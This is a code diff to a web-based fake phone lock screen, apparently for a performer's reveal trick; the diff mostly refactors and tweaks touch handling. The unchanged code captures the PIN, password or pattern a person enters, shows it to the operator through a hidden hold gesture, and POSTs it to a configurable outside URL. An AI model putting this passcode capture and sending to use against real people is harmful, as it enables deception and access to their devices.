@@ -15,7 +15,6 @@ const config = {
     url: ""
 };
 
-// Persistence & Initialization
 window.onload = () => {
     const saved = localStorage.getItem('lockscreen_settings');
     if (saved) {
@@ -25,27 +24,23 @@ window.onload = () => {
         document.getElementById('peek-try').value = config.peekAt;
         document.getElementById('send-try').value = config.sendAt;
         document.getElementById('script-url').value = config.url;
-        
-        // Restore active chip
-        document.querySelectorAll('.chip').forEach(c => {
-            c.classList.toggle('active', c.dataset.value === config.mode);
-        });
+        document.querySelectorAll('.chip').forEach(c => c.classList.toggle('active', c.dataset.value === config.mode));
     }
     updateTime();
-    setInterval(updateTime, 10000);
+    setInterval(updateTime, 5000);
 };
 
-// Triple tap anywhere to reset to setup
+// Fix 1: Triple tap restricted to dead space
 window.addEventListener('touchstart', (e) => {
+    if (e.target.closest('button') || e.target.closest('input') || e.target.closest('canvas') || e.target.closest('.chip')) {
+        return; 
+    }
     globalTapCount++;
     clearTimeout(globalTapTimer);
     globalTapTimer = setTimeout(() => { globalTapCount = 0; }, 500);
-    if (globalTapCount === 3) {
-        location.reload(); // Simplest way to go back to setup and reset all states
-    }
+    if (globalTapCount === 3) location.reload(); 
 });
 
-// Chip Selection logic
 document.querySelectorAll('.chip').forEach(chip => {
     chip.addEventListener('click', () => {
         document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
@@ -59,7 +54,6 @@ document.getElementById('start-app').addEventListener('click', () => {
     config.peekAt = parseInt(document.getElementById('peek-try').value) || 1;
     config.sendAt = parseInt(document.getElementById('send-try').value) || 1;
     config.url = document.getElementById('script-url').value;
-    
     localStorage.setItem('lockscreen_settings', JSON.stringify(config));
     document.getElementById('setup-page').classList.add('hidden');
     document.getElementById('lock-page').classList.remove('hidden');
@@ -67,55 +61,41 @@ document.getElementById('start-app').addEventListener('click', () => {
 });
 
 function initLockMode() {
-    // Hide all input elements first
-    document.getElementById('pin-dots').classList.add('hidden');
-    document.getElementById('pin-pad').classList.add('hidden');
-    document.getElementById('password-tap-zone').classList.add('hidden');
-    document.getElementById('pattern-canvas').classList.add('hidden');
-
-    // Show correct elements based on mode
-    if (config.mode === 'pin4' || config.mode === 'pin6') {
-        const dotsCount = config.mode === 'pin4' ? 4 : 6;
-        document.getElementById('pin-dots').innerHTML = '<div class="dot"></div>'.repeat(dotsCount);
+    ['pin-dots', 'pin-pad', 'password-tap-zone', 'pattern-canvas'].forEach(id => document.getElementById(id).classList.add('hidden'));
+    if (config.mode.startsWith('pin')) {
+        const dots = config.mode === 'pin4' ? 4 : 6;
+        document.getElementById('pin-dots').innerHTML = '<div class="dot"></div>'.repeat(dots);
         document.getElementById('pin-dots').classList.remove('hidden');
         document.getElementById('pin-pad').classList.remove('hidden');
     } else if (config.mode === 'password') {
         document.getElementById('password-tap-zone').classList.remove('hidden');
-        const input = document.getElementById('hidden-pass-input');
-        input.value = "";
-        input.addEventListener('keydown', (e) => { if(e.key === 'Enter') processEntry(input.value); });
     } else if (config.mode === 'pattern') {
         document.getElementById('pattern-canvas').classList.remove('hidden');
         drawDots(); 
     }
 }
 
-// Secret Trigger & Peek Logic (1s Hold)
+// Fix 4: 1s Hold
 const triggers = ['secret-trigger-lock', 'secret-trigger-home'];
 triggers.forEach(id => {
     const el = document.getElementById(id);
     const peekEl = id === 'secret-trigger-lock' ? 'peek-display' : 'peek-display-home';
-    
     el.addEventListener('touchstart', e => {
         const now = Date.now();
         if (now - lastTapTime < 300) {
             forceSuccess = !forceSuccess;
-            navigator.vibrate(20);
             document.getElementById('active-dot').style.opacity = forceSuccess ? 0.8 : 0;
         }
         lastTapTime = now;
         holdTimer = setTimeout(() => {
             drawPeek(peekEl);
             document.getElementById(peekEl).classList.remove('hidden');
-        }, 1000); // 1 second hold
+        }, 1000);
     });
-    el.addEventListener('touchend', () => {
-        clearTimeout(holdTimer);
-        document.getElementById(peekEl).classList.add('hidden');
-    });
+    el.addEventListener('touchend', () => { clearTimeout(holdTimer); document.getElementById(peekEl).classList.add('hidden'); });
 });
 
-// Core Pattern Logic
+// Fix 6: Enhanced Touch Responsiveness for Pattern
 const canvas = document.getElementById('pattern-canvas');
 const ctx = canvas.getContext('2d');
 const dotsArray = [];
@@ -124,7 +104,7 @@ let currentPattern = [];
 
 function drawDots() {
     ctx.clearRect(0, 0, 300, 300);
-    ctx.strokeStyle = "white"; ctx.lineWidth = 4;
+    ctx.strokeStyle = "white"; ctx.lineWidth = 4; ctx.lineCap = "round"; ctx.lineJoin = "round";
     if (currentPattern.length > 0) {
         ctx.beginPath();
         ctx.moveTo(dotsArray[currentPattern[0]].x, dotsArray[currentPattern[0]].y);
@@ -139,43 +119,39 @@ function drawDots() {
 }
 
 canvas.addEventListener('touchmove', (e) => {
+    e.preventDefault(); // Prevents "stiff" feeling or scrolling while drawing
     const rect = canvas.getBoundingClientRect();
-    const x = e.touches[0].clientX - rect.left;
-    const y = e.touches[0].clientY - rect.top;
+    const touch = e.touches[0];
+    const x = touch.clientX - rect.left;
+    const y = touch.clientY - rect.top;
     dotsArray.forEach(d => {
-        if(Math.sqrt((x-d.x)**2 + (y-d.y)**2) < 30 && !currentPattern.includes(d.id)) {
+        if(Math.sqrt((x-d.x)**2 + (y-d.y)**2) < 35 && !currentPattern.includes(d.id)) {
             currentPattern.push(d.id);
-            navigator.vibrate(10);
+            if(navigator.vibrate) navigator.vibrate(10);
+            drawDots();
         }
     });
-    drawDots();
-});
+}, {passive: false});
 
 canvas.addEventListener('touchend', () => {
     if(currentPattern.length > 1) processEntry(currentPattern.join('-'), true);
     currentPattern = []; drawDots();
 });
 
-// Core Entry Processing
 function processEntry(val, isPattern = false) {
     attemptCount++;
     if (attemptCount === config.peekAt) peekData = isPattern ? val.split('-').map(Number) : val;
-    if (attemptCount === config.sendAt && config.url) {
-        fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
-    }
-
+    if (attemptCount === config.sendAt && config.url) fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
     if (attemptCount === config.successAt || forceSuccess) {
         document.getElementById('unlock-sound').play();
         document.getElementById('lock-page').classList.add('hidden');
         document.getElementById('home-page').classList.remove('hidden');
     } else {
         document.getElementById('lock-content').classList.add('shake');
-        navigator.vibrate([50, 50, 50]);
         setTimeout(() => document.getElementById('lock-content').classList.remove('shake'), 400);
         currentInput = "";
         document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
-        const pIn = document.getElementById('hidden-pass-input');
-        if(pIn) pIn.value = "";
+        if(document.getElementById('hidden-pass-input')) document.getElementById('hidden-pass-input').value = "";
     }
 }
 
@@ -190,13 +166,12 @@ document.querySelectorAll('.num').forEach(btn => {
     });
 });
 
-// Peek Visualizer with Arrows
+// Fix 5: Clear Pattern Peek with Sharp Arrows
 function drawPeek(targetCanvasId) {
     const pCanvas = document.getElementById(targetCanvasId);
     const pCtx = pCanvas.getContext('2d');
     pCtx.clearRect(0, 0, 80, 80);
     if (!peekData) return;
-
     pCtx.strokeStyle = "white"; pCtx.fillStyle = "white"; pCtx.lineWidth = 2;
     if (Array.isArray(peekData)) {
         pCtx.beginPath();
@@ -207,27 +182,26 @@ function drawPeek(targetCanvasId) {
                 const prevId = peekData[i-1];
                 const px = (prevId % 3) * 20 + 20; const py = Math.floor(prevId / 3) * 20 + 20;
                 pCtx.lineTo(x,y);
-                drawArrow(pCtx, px, py, x, y);
+                const angle = Math.atan2(y - py, x - px);
+                const mx = (px + x) / 2; const my = (py + y) / 2;
+                pCtx.moveTo(mx, my);
+                pCtx.lineTo(mx - 6 * Math.cos(angle - Math.PI / 6), my - 6 * Math.sin(angle - Math.PI / 6));
+                pCtx.moveTo(mx, my);
+                pCtx.lineTo(mx - 6 * Math.cos(angle + Math.PI / 6), my - 6 * Math.sin(angle + Math.PI / 6));
+                pCtx.moveTo(x, y);
             }
         });
         pCtx.stroke();
     } else {
-        pCtx.font = "bold 16px Arial"; pCtx.textAlign = "center";
-        pCtx.fillText(peekData, 40, 45);
+        pCtx.font = "bold 16px Arial"; pCtx.textAlign = "center"; pCtx.fillText(peekData, 40, 45);
     }
 }
 
-function drawArrow(ctx, fx, fy, tx, ty) {
-    const angle = Math.atan2(ty - fy, tx - fx);
-    const mx = (fx + tx) / 2; const my = (fy + ty) / 2;
-    ctx.moveTo(mx, my);
-    ctx.lineTo(mx - 6 * Math.cos(angle - Math.PI / 6), my - 6 * Math.sin(angle - Math.PI / 6));
-    ctx.moveTo(mx, my);
-    ctx.lineTo(mx - 6 * Math.cos(angle + Math.PI / 6), my - 6 * Math.sin(angle + Math.PI / 6));
-}
-
+// Fix 4: 12-hour format
 function updateTime() {
     const now = new Date();
-    document.querySelector('.clock').innerText = now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
+    let hours = now.getHours();
+    const minutes = now.getMinutes().toString().padStart(2, '0');
+    hours = hours % 12 || 12;
+    document.querySelector('.clock').innerText = `${hours}:${minutes}`;
 }
-
